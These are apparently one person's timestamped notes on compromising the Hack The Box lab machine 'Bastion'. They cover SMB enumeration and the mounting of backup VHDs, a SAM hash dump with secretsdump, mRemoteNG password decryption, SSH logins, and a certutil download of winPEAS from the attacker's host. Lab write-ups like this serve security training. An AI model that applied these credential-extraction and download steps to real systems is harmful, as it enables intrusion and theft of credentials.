```


Bastion - HTB - EASY - NOT EASY! - SMB VHD MAPPING and mremoteng
IP: 10.10.10.134

lessons learned:
- SMB VHD MAPPING and mremoteng
- eternalblue 
- smbclient
- guest mount for vhd

```

```
3:04 PM 1/23/2023

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastion]
└─# nmap -sC -sV 10.10.10.134 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 20:07 EST
Nmap scan report for 10.10.10.134
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)																# creds at somepoint
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows												# eternal blue

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-24T01:09:31
|_  start_date: 2023-01-24T01:04:05
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-24T02:09:33+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.79 seconds
```

```
3:12 PM 1/23/2023
smbclient -L \\\\10.10.10.134

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbclient -L \\\\10.10.10.134
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
3:13 PM 1/23/2023
smbclient -L \\\\10.10.10.134\\Backups
```

```
3:18 PM 1/23/2023
smbclient \\\\10.10.10.134\\Backups

					┌──(root㉿kali)-[/home/kali/Documents/transfer]
					└─# smbclient \\\\10.10.10.134\\Backups
					Password for [WORKGROUP\kali]:
					Try "help" to get a list of possible commands.
					smb: \> ls
					  .                                   D        0  Tue Apr 16 06:02:11 2019
					  ..                                  D        0  Tue Apr 16 06:02:11 2019
					  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
					  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
					  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019

							5638911 blocks of size 4096. 1177928 blocks available
					smb: \> get note.txt
					getting file \note.txt of size 116 as note.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
					smb: \> 
					
					
					A (Archive) is only used by backup programs (including xcopy/robocopy). Such tools clear it when making a copy, and the OS automatically sets it again whenever the file changes, which avoids the need to compare modification times.

					D (Directory) is not changeable and just indicates that the entry is a directory.

					R (Read-only) makes the file read-only.

					For directories, it doesn't do anything at OS-level, but indicates to Windows Explorer that the directory might have a custom icon or other settings (i.e. indicates that Explorer should read the desktop.ini file).

					H (Hidden) hides the file from regular listings; Windows uses this attribute instead of "dot" files. Apparently smbclient does not care.

					S (System) hides the file slightly more, and causes Windows Explorer to warn before doing anything with the file. Apparently it also used to indicate to Windows 9x and MS-DOS that the file should not be moved physically. (For directories, it's similar to +R.)
					
3:24 PM 1/23/2023
Looking around in the directories, possibly found a flag or a hash?

smb: \WindowsImageBackup\L4mpje-PC\SPPMetadataCache\> ls
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  {cd113385-65ff-4ea2-8ced-5630f6feca8f}     An    57848  Fri Feb 22 07:45:32 2019

		5638911 blocks of size 4096. 1177861 blocks available
```

```
3:29 PM 1/23/2023																													# grabbed catalog files
smb: \WindowsImageBackup\L4mpje-PC\Catalog\> ls
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  BackupGlobalCatalog                An     5698  Fri Feb 22 07:44:02 2019
  GlobalCatalog                      An     7440  Fri Feb 22 07:45:32 2019

		5638911 blocks of size 4096. 1177793 blocks available
smb: \WindowsImageBackup\L4mpje-PC\Catalog\> get BackupGlobalCatalog 
getting file \WindowsImageBackup\L4mpje-PC\Catalog\BackupGlobalCatalog of size 5698 as BackupGlobalCatalog (6.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
smb: \WindowsImageBackup\L4mpje-PC\Catalog\> get GlobalCatalog
getting file \WindowsImageBackup\L4mpje-PC\Catalog\GlobalCatalog of size 7440 as GlobalCatalog (6.9 KiloBytes/sec) (average 6.6 KiloBytes/sec)
smb: \WindowsImageBackup\L4mpje-PC\Catalog\> 
```

```
3:50 PM 1/23/2023
No real way forward right now, scaznning all ports to see if theres anything else open.
```

```
4:17 PM 1/23/2023																												# starting scan of machine for all ports, taking break.

nmap -sC -sV -p- 10.10.10.134                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 21:16 EST
```

```
5:41 PM 1/23/2023																								# NMAP WASNT WORKING, overlooked vhd files in backups drive, walkthrough shows mounting. going to follow through.
```

```
5:43 PM 1/23/2023
https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25 # how to mount a vhd
```

```
5:50 PM 1/23/2023
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls													# going to try to connect to virtual hard drive, using next commands
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
```

```
5:50 PM 1/23/2023
┌──(root㉿kali)-[/]
└─# mount -t cifs -o 'rw,username=guest' //10.10.10.134/Backups backups
Password for guest@//10.10.10.134/Backups: 

┌──(root㉿kali)-[/backups]																							# successfully mapped
└─# ls
note.txt  SDT65CB.tmp  test.txt  WindowsImageBackup
```

```
5:54 PM 1/23/2023																									# 
┌──(root㉿kali)-[/backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─# ls  
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

```
6:26 PM 1/23/2023																										# command to mount to vhd files
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# guestmount -a /backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro /home/kali/Documents/hackthebox/bastion/ -o nonempty 




──(root㉿kali)-[/home/kali/Documents/transfer]																			# have to cd in the terminal that was used to mount or the drive will not show
└─# cd /home/kali/Documents/hackthebox/bastion/
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastion]
└─# ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastion]
└─#    

6:38 PM 1/23/2023																										# copied SAM/SECURITY/SYSTEM INTO new /home/kali/Documents/hackthebox/SAM directory to break the hashes with SAM.
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SAM /home/kali/Documents/hackthebox/SAM
                                                                                                                      
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SECURITY /home/kali/Documents/hackthebox/SAM
                                                                                                                      
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SYSTEM /home/kali/Documents/hackthebox/SAM
```

```
6:40 PM 1/23/2023																												# secretsdump.py on the NTLM hashes, systax provided
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/SAM]
└─# secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje																						### password, going to try to ssh
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/SAM]
└─# 
```

```
6:44 PM 1/23/2023																												### ssh'd on, going to stop with walkthrough and figure out the priv esc myself
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]                                                                                
(c) 2016 Microsoft Corporation. All rights reserved.                                                                  

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                 
bastion\l4mpje                                                                                                        

l4mpje@BASTION C:\Users\L4mpje>                
```

```
6:45 PM 1/23/2023																																		# user.txt
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                                  
e61658088d2c868e79c234068ffa057e             
```

```
6:46 PM 1/23/2023																																# cant upload tools, going through manual check
certutil -urlcache -f http://10.10.16.12:8000/winPEAS.bat winPEAS.bat
```

```
6:49 PM 1/23/2023
l4mpje@BASTION C:\>whoami /priv                                                                                       

PRIVILEGES INFORMATION                                                                                                
----------------------                                                                                                

Privilege Name                Description                    State                                                    
============================= ============================== =======                                                  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled      
```

```
6:51 PM 1/23/2023
l4mpje@BASTION C:\>systeminfo                                                                                         
ERROR: Access denied       
```

```
6:56 PM 1/23/2023
l4mpje@BASTION C:\>cd Program Files (x86)                                                                             

l4mpje@BASTION C:\Program Files (x86)>dir                                                                             
 Volume in drive C has no label.                                                                                      
 Volume Serial Number is 1B7D-E692                                                                                    

 Directory of C:\Program Files (x86)                                                                                  

22-02-2019  14:01    <DIR>          .                                                                                 
22-02-2019  14:01    <DIR>          ..                                                                                
16-07-2016  14:23    <DIR>          Common Files                                                                      
23-02-2019  09:38    <DIR>          Internet Explorer                                                                 
16-07-2016  14:23    <DIR>          Microsoft.NET                                                                     
22-02-2019  14:01    <DIR>          mRemoteNG          								
# of importance!!!!!                                                               
23-02-2019  10:22    <DIR>          Windows Defender                                                                  
23-02-2019  09:38    <DIR>          Windows Mail                                                                      
23-02-2019  10:22    <DIR>          Windows Media Player                                                              
16-07-2016  14:23    <DIR>          Windows Multimedia Platform                                                       
16-07-2016  14:23    <DIR>          Windows NT                                                                        
23-02-2019  10:22    <DIR>          Windows Photo Viewer                                                              
16-07-2016  14:23    <DIR>          Windows Portable Devices                                                          
16-07-2016  14:23    <DIR>          WindowsPowerShell                                                                 
               0 File(s)              0 bytes                                                                         
              14 Dir(s)   4.811.771.904 bytes free                                                                    

l4mpje@BASTION C:\Program Files (x86)>                                                                                
```

```
6:56 PM 1/23/2023
################### TCM " WE HAVE TO MAKE SURE TO LOOK AT OTHER THINGS ON THE BOX, WE CANNOT JUST RELY ON AUTOMATED TOOLS "
```

```
7:52 PM 1/23/2023
%APPDATA%\mRemoteNG\confCons.xml														
# looking here to see if remoteng passwords are stored here.
```

```
7:56 PM 1/23/2023
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml 				
# found password

Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRd
C7emf7lWWA10dQKiw=="
```

```
7:52 PM 1/23/2023
https://github.com/haseebT/mRemoteNG-Decrypt											
# mremoteng to decrypt passwords - downloaded.
```

```
8:00 PM 1/23/2023
──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRd
C7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2																					
```

```
8:01 PM 1/23/2023
ssh administrator@10.10.10.134
thXLHM96BeKL0ER2	
```

```
8:11 PM 1/23/2023
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                             														# root flag.     
078a442cfe2c846ea08fa4eb55ff17b3
```